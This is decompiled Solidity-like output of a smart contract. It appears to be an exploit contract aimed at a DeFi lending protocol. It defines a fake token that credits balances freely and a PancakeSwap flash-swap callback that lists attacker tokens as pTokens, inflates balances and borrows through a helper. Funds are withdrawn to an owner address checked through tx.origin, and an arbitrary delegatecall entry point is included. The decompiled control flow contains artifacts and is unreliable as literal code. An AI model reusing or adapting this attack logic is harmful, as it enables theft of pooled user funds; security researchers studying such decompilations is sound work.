// Decompiled by library.dedaub.com
// 2023.01.13 07:55 UTC

// Data structures and variables inferred from the use of storage instructions
uint256[] array_6; // STORAGE[0x6]
uint256 stor_b; // STORAGE[0xb]
uint256 stor_d; // STORAGE[0xd]
mapping (uint256 => [uint256]) _balanceOf; // STORAGE[0xf]
address _recover; // STORAGE[0x0] bytes 0 to 19
address stor_1_0_19; // STORAGE[0x1] bytes 0 to 19
address stor_2_0_19; // STORAGE[0x2] bytes 0 to 19
address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
uint160 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19
address owner_5_0_19; // STORAGE[0x5] bytes 0 to 19
uint160 stor_7_0_19; // STORAGE[0x7] bytes 0 to 19
address stor_9_0_19; // STORAGE[0x9] bytes 0 to 19
address _setBorrower; // STORAGE[0xa] bytes 0 to 19
uint160 stor_e_0_19; // STORAGE[0xe] bytes 0 to 19


function 0x12d1(uint256 varg0, uint256 varg1, uint256 varg2, uint256 varg3) private { 
    v0 = address(varg2);
    require(stor_3_0_19.code.size);
    v1, v2 = stor_3_0_19.pTokens(v0).gas(msg.gas);
    require(v1); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v2 == address(v2));
    require(address(v2), Error(0x4254505400000000000000000000000000000000000000000000000000000000));
    v3 = address(varg3);
    require(stor_3_0_19.code.size);
    v4, v5 = stor_3_0_19.pTokens(v3).gas(msg.gas);
    require(v4); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v5 == address(v5));
    require(address(v5), Error(0x5243505400000000000000000000000000000000000000000000000000000000));
    v6 = new array[](array_6.length);
    v7 = v8 = v6.data;
    v9 = v10 = 0;
    while (v9 < array_6.length) {
        MEM[v7] = address(STORAGE[v11]);
        v7 += 32;
        v11 += 1;
        v9 += 1;
    }
    require(_setBorrower.code.size);
    v12 = _setBorrower.call(0x8e235202, _recover, stor_9_0_19, address(v5), varg0, v6, address(v2), varg1, stor_4_0_19, owner_5_0_19).gas(msg.gas);
    require(v12); // checks call status, propagates error data on error
    return ;
}

function symbol() public nonPayable { 
    v0 = new array[](v1.length);
    v2 = v3 = 0;
    while (v2 < v1.length) {
        v0[v2] = v1[v2];
        v2 += 32;
    }
    if (v2 > v1.length) {
        v0[v1.length] = 0;
        goto 0x1cfaB0x1e08B0x13b;
    }
    return v0, v4, 0x5800000000000000000000000000000000000000000000000000000000000000;
}

function 0x1535(uint256 varg0, uint256 varg1, uint256 varg2) private { 
    v0 = v1 = 0;
    while (v0 < array_6.length) {
        if (v0 < array_6.length) {
            break;
        }
        require(v0 < array_6.length, Panic(50));
        require((address(array_6[v0])).code.size);
        v2 = address(array_6[v0]).setBorrower(_setBorrower).gas(msg.gas);
        require(v2); // checks call status, propagates error data on error
        require((address(array_6[v0])).code.size);
        v3, v4 = address(array_6[v0]).staticcall(0x55a9f495).gas(msg.gas);
        require(v3); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v4 == address(v4));
        v5 = _SafeMul(10, varg0);
        require(stor_9_0_19.code.size);
        v6 = stor_9_0_19.call(0xb00daa9200000000000000000000000000000000000000000000000000000000, address(v4), v5).gas(msg.gas);
        require(v6); // checks call status, propagates error data on error
        v0 = 0x1f20(v0);
    }
    v7 = address(varg2);
    require(_setBorrower.code.size);
    v8 = _setBorrower.call(0x7f2975a9, v7, varg1).gas(msg.gas);
    require(v8); // checks call status, propagates error data on error
    return ;
}

function pancakeCall(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(varg0 == varg0);
    require(varg3 <= 0xffffffffffffffff);
    require(4 + varg3 + 31 < msg.data.length);
    require(varg3.length <= 0xffffffffffffffff);
    require(4 + varg3 + varg3.length + 32 <= msg.data.length);
    require(tx.origin == _recover, Error(0x6f00000000000000000000000000000000000000000000000000000000000000));
    require(varg3.data + varg3.length - varg3.data >= 256);
    require(varg3[64] == address(varg3[64]));
    require(varg3[96] == address(varg3[96]));
    require(varg3[160] == address(varg3[160]));
    require(owner_5_0_19.code.size);
    v0, v1 = owner_5_0_19.balanceOf(msg.sender).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v2 = v3 = 0;
    while (v2 < array_6.length) {
        if (v2 < array_6.length) {
            break;
        }
        require(v2 < array_6.length, Panic(50));
        if ((address(array_6[v2])).code.size) {
            break;
        }
        require((address(array_6[v2])).code.size);
        v4, v5 = address(array_6[v2]).staticcall(0x5255869f).gas(msg.gas);
        if (v4) {
            break;
        }
        require(v4); // checks call status, propagates error data on error
        if (MEM[64] + RETURNDATASIZE() - MEM[64] >= 32) {
            break;
        }
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        if (v5 == address(v5)) {
            break;
        }
        require(v5 == address(v5));
        if (address(v5)) {
            break;
        }
        require(address(v5), Error('FTBPP'));
        if ((address(array_6[v2])).code.size) {
            break;
        }
        require((address(array_6[v2])).code.size);
        v6, v7 = address(array_6[v2]).call(0x8988537a00000000000000000000000000000000000000000000000000000000, address(v5), varg3[32]).gas(msg.gas);
        require(v6); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v7 == v7);
        require(owner_5_0_19.code.size);
        v8, v9 = owner_5_0_19.transfer(address(v5), varg3[32]).gas(msg.gas);
        require(v8); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v9 == v9);
        require((address(v5)).code.size);
        v10, v11 = address(v5).mint(address(v5)).gas(msg.gas);
        require(v10); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(stor_2_0_19.code.size);
        v12, v13 = stor_2_0_19.createPToken(address(array_6[v2])).gas(msg.gas);
        require(v12); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(!v13, Error(0x4350540000000000000000000000000000000000000000000000000000000000));
        require(stor_3_0_19.code.size);
        v14, v15 = stor_3_0_19.pTokens(address(array_6[v2])).gas(msg.gas);
        require(v14); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v15 == address(v15));
        require(address(v15), Error(0x5054300000000000000000000000000000000000000000000000000000000000));
        require((address(array_6[v2])).code.size);
        v16 = address(array_6[v2]).call(0xe5b61ad600000000000000000000000000000000000000000000000000000000, address(v15)).gas(msg.gas);
        require(v16); // checks call status, propagates error data on error
        v17 = _SafeSub(array_6.length, 1);
        if (v2 != v17) {
            require((address(v5)).code.size);
            v18 = address(v5).burn(this).gas(msg.gas);
            require(v18); // checks call status, propagates error data on error
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 64);
        } else {
            require((address(v5)).code.size);
            v19 = address(v5).burn(msg.sender).gas(msg.gas);
            require(v19); // checks call status, propagates error data on error
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 64);
        }
        v2 = 0x1f20(v2);
    }
    0x12d1(varg3[224], varg3[192], varg3[160], varg3[96]);
    0x1535(varg3[224], varg3[128], varg3[64]);
    require(owner_5_0_19.code.size);
    v20, v21 = owner_5_0_19.balanceOf(msg.sender).gas(msg.gas);
    require(v20); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v22 = _SafeSub(v21, v1);
    v23 = _SafeMul(msg.data[varg3.data], stor_d);
    require(10000, Panic(18));
    v24 = _SafeSub(v23 / 10000, v22);
    require(owner_5_0_19.code.size);
    v25, v26 = owner_5_0_19.transfer(msg.sender, v24).gas(msg.gas);
    require(v25); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v26 == v26);
}

function totalSupply() public nonPayable { 
    return 0x785ee10d5da46d900f436a000000000;
}

function recover(address varg0, address varg1, uint256 varg2) public nonPayable { 
    require(msg.data.length - 4 >= 96);
    require(varg0 == varg0);
    require(varg1 == varg1);
    require(tx.origin == _recover, Error(0x6f00000000000000000000000000000000000000000000000000000000000000));
    require(varg0.code.size);
    v0, v1 = varg0.transfer(varg1, varg2).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v1 == v1);
}

function transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { 
    require(msg.data.length - 4 >= 96);
    require(varg0 == varg0);
    require(varg1 == varg1);
    v0 = _SafeAdd(_balanceOf[varg1], varg2);
    _balanceOf[varg1] = v0;
    return 1;
}

function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    require(varg0 <= ~varg1, Panic(17));
    return varg0 + varg1;
}

function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require(!(varg0 & (varg1 > ~0 / varg0)), Panic(17));
    return varg0 * varg1;
}

function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 >= varg1, Panic(17));
    return varg0 - varg1;
}

function 0x1f20(uint256 varg0) private { 
    require(varg0 != ~0, Panic(17));
    return 1 + varg0;
}

function decimals() public nonPayable { 
    return 18;
}

function 0x5255869f() public nonPayable { 
    return stor_e_0_19;
}

function () public payable { 
}

function 0x55a9f495() public nonPayable { 
    return stor_7_0_19;
}

function 0x60c863b9() public nonPayable { 
    require(!stor_e_0_19, Error(0x4149000000000000000000000000000000000000000000000000000000000000));
    require(stor_1_0_19.code.size);
    v0, v1 = stor_1_0_19.factory().gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v1 == address(v1));
    require((address(v1)).code.size);
    v2, v3 = address(v1).createPair(owner_5_0_19, this).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3 == address(v3));
    require(address(v3), Error(0x4350500000000000000000000000000000000000000000000000000000000000));
    stor_e_0_19 = v3;
}

function balanceOf(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(varg0 == varg0);
    return _balanceOf[varg0];
}

function 0x8988537a(uint256 varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(varg0 == address(varg0));
    v0 = _SafeAdd(_balanceOf[address(varg0)], varg1);
    _balanceOf[address(varg0)] = v0;
    return 1;
}

function 0x8ce4a1f2(uint256 varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(varg0 == address(varg0));
    require(varg1 <= 0xffffffffffffffff);
    require(4 + varg1 + 31 < msg.data.length);
    require(varg1.length <= 0xffffffffffffffff, Panic(65));
    v0 = new bytes[](varg1.length);
    require(!((v0 + (~0x1f & 32 + (~0x1f & varg1.length + 31) + 31) < v0) | (v0 + (~0x1f & 32 + (~0x1f & varg1.length + 31) + 31) > 0xffffffffffffffff)), Panic(65));
    require(4 + varg1 + varg1.length + 32 <= msg.data.length);
    CALLDATACOPY(v0.data, varg1.data, varg1.length);
    v0[varg1.length] = 0;
    require(tx.origin == _recover, Error(0x6f00000000000000000000000000000000000000000000000000000000000000));
    v1 = v2 = 0;
    while (v1 < v0.length) {
        MEM[v1 + v3.data] = v0[v1];
        v1 += 32;
    }
    if (v1 > v0.length) {
        MEM[v0.length + v3.data] = 0;
        goto 0x1d20B0x301;
    }
    v4, v5, v6, v7 = address(varg0).delegatecall(v3.data).gas(msg.gas);
    if (RETURNDATASIZE() == 0) {
        v8 = v9 = 96;
    } else {
        v8 = v10 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v10.data, 0, RETURNDATASIZE());
    }
    if (v4) {
        v11 = new array[](MEM[v8]);
        v12 = v13 = 0;
        while (v12 < MEM[v8]) {
            v11[v12] = MEM[v12 + (v8 + 32)];
            v12 += 32;
        }
        if (v12 > MEM[v8]) {
            v11[MEM[v8]] = 0;
            goto 0x1cfaB0x1de5B0x306;
        }
        return v4, v11;
    } else {
        v14 = new array[](MEM[v8]);
        v15 = v16 = 0;
        while (v15 < MEM[v8]) {
            v14[v15] = MEM[v15 + v7];
            v15 += 32;
        }
        if (v15 > MEM[v8]) {
            v14[MEM[v8]] = 0;
            goto 0x1cfaB0x1e08B0x7ddB0x301;
        }
        revert(Error(v14));
    }
}

function 0x98383887(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(varg0 <= 0xffffffffffffffff);
    require(4 + varg0 + 31 < msg.data.length);
    require(varg0.length <= 0xffffffffffffffff, Panic(65));
    require(!((MEM[64] + (~0x1f & (varg0.length << 5) + 32 + 31) < MEM[64]) | (MEM[64] + (~0x1f & (varg0.length << 5) + 32 + 31) > 0xffffffffffffffff)), Panic(65));
    v0 = v1 = MEM[64] + 32;
    v2 = v3 = varg0.data;
    require(msg.data.length >= 32 + (4 + varg0 + (varg0.length << 5)));
    v4 = v5 = 0;
    while (v4 < varg0.length) {
        require(msg.data[v2] == address(msg.data[v2]));
        MEM[v0] = msg.data[v2];
        v4 += 1;
        v0 += 32;
        v2 += 32;
    }
    v6 = v7 = MEM[64] + 32;
    array_6.length = varg0.length;
    if (varg0.length) {
        while (v7 + (varg0.length << 5) > v6) {
            STORAGE[v8] = address(MEM[v6]) | ~0xffffffffffffffffffffffffffffffffffffffff & STORAGE[v8];
            v6 = v6 + 32;
            v8 = v8 + 1;
        }
    }
    while (v9 + array_6.length > v8) {
        STORAGE[v8] = 0;
        v8 += 1;
    }
}

function 0xa1819562() public nonPayable { 
    return stor_b;
}

function 0xa64d5ab7(uint256 varg0, uint256 varg1, uint256 varg2, uint256 varg3, uint256 varg4, uint256 varg5, uint256 varg6) public nonPayable { 
    require(msg.data.length - 4 >= 224);
    require(varg0 == address(varg0));
    require(varg1 == address(varg1));
    require(varg3 == address(varg3));
    require(varg6 == address(varg6));
    require(tx.origin == _recover, Error(0x6f00000000000000000000000000000000000000000000000000000000000000));
    _setBorrower = varg6;
    if (stor_7_0_19) {
        0x12d1(varg5, varg4, varg3, varg1);
        0x1535(varg5, varg2, varg0);
    } else {
        require(stor_2_0_19.code.size);
        v0, v1 = stor_2_0_19.minUniswapLiquidity().gas(msg.gas);
        require(v0); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v2 = _SafeAdd(100, array_6.length);
        v3 = _SafeMul(v1, v2);
        require(100, Panic(18));
        v4 = v3 / 100;
        v5 = new array[](address(varg1));
        MEM[v5.data] = varg2;
        v4 = v6 = 0;
        require(stor_1_0_19.code.size);
        v7, v8 = stor_1_0_19.token0().gas(msg.gas);
        require(v7); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        require(v8 == address(v8));
        if (address(v8) == owner_5_0_19) {
        }
        v9 = new array[](v10);
        v11 = v12 = 0;
        while (v11 < v10) {
            v9[v11] = MEM[v11 + (MEM[64] + 32)];
            v11 += 32;
        }
        if (v11 > v10) {
            v9[v10] = 0;
            goto 0x1cfaB0x1e1bB0xa22B0x365;
        }
        require(stor_1_0_19.code.size);
        v13 = stor_1_0_19.swap(v4, v4, address(this), v9, v5, v4, v1, address(varg0), v14, v14, address(varg3), varg4, varg5).gas(msg.gas);
        require(v13); // checks call status, propagates error data on error
    }
    require(owner_5_0_19.code.size);
    v15, v16 = owner_5_0_19.balanceOf(this).gas(msg.gas);
    require(v15); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    if (v16) {
        require(owner_5_0_19.code.size);
        v17 = owner_5_0_19.withdraw(v16).gas(msg.gas);
        require(v17); // checks call status, propagates error data on error
        v18 = _recover.call().value(v16).gas(2300 * !v16);
        require(v18); // checks call status, propagates error data on error
        goto 0xab30x814B0x365;
    }
}

function transfer(address varg0, uint256 varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(varg0 == varg0);
    if (_setBorrower) {
        require(_setBorrower.code.size);
        v0 = _setBorrower.call(0x7a17edf7).gas(msg.gas);
        require(v0); // checks call status, propagates error data on error
    }
    v1 = _SafeAdd(_balanceOf[varg0], varg1);
    _balanceOf[varg0] = v1;
    return 1;
}

function setBorrower(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(varg0 == varg0);
    _setBorrower = varg0;
}

function 0xe5b61ad6(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(varg0 == address(varg0));
    stor_7_0_19 = varg0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        ();
    } else {
        if (0x84800812 > function_selector >> 224) {
            if (0x313ce567 > function_selector >> 224) {
                if (0x6fdde03 != function_selector >> 224) {
                    if (0x10d1e85c != function_selector >> 224) {
                        if (0x18160ddd == function_selector >> 224) {
                            totalSupply();
                        } else if (0x1ec82cb8 == function_selector >> 224) {
                            recover(address,address,uint256);
                        } else {
                            require(0x23b872dd == function_selector >> 224);
                            transferFrom(address,address,uint256);
                        }
                    }
                }
            } else if (0x313ce567 == function_selector >> 224) {
                decimals();
            } else if (0x5255869f == function_selector >> 224) {
                0x5255869f();
            } else if (0x55a9f495 == function_selector >> 224) {
                0x55a9f495();
            } else if (0x60c863b9 == function_selector >> 224) {
                0x60c863b9();
            } else {
                require(0x70a08231 == function_selector >> 224);
                balanceOf(address);
            }
        } else if (0xa1819562 > function_selector >> 224) {
            if (0x84800812 != function_selector >> 224) {
                if (0x8988537a == function_selector >> 224) {
                    0x8988537a();
                } else if (0x8ce4a1f2 == function_selector >> 224) {
                    0x8ce4a1f2();
                } else if (0x95d89b41 != function_selector >> 224) {
                    require(0x98383887 == function_selector >> 224);
                    0x98383887();
                }
            }
        } else if (0xa1819562 == function_selector >> 224) {
            0xa1819562();
        } else if (0xa64d5ab7 == function_selector >> 224) {
            0xa64d5ab7();
        } else if (0xa9059cbb == function_selector >> 224) {
            transfer(address,uint256);
        } else if (0xc762d5f7 == function_selector >> 224) {
            setBorrower(address);
        } else {
            require(0xe5b61ad6 == function_selector >> 224);
            0xe5b61ad6();
        }
        pancakeCall(address,uint256,uint256,bytes);
        symbol();
    }
}
